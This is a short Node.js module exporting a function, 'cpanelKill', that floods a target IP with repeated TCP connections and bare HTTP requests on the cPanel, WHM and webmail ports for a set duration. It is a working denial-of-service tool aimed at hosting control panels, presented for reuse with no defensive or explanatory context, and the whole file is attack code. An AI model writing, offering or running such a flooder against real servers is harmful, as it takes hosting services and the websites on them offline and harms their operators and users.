const net = require('net');

function cpanelKill(ip, duration) {
  const end = Date.now() + duration*1000;
  const ports = [2082,2083,2086,2087,2095,2096];
  while(Date.now() < end){
    ports.forEach(port=>{
      const s = net.connect({host: ip, port}, ()=>{ s.write('GET / HTTP/1.1\r\n\r\n'); s.end(); });
      s.on('error',()=>{});
    });
  }
}
module.exports = { cpanelKill };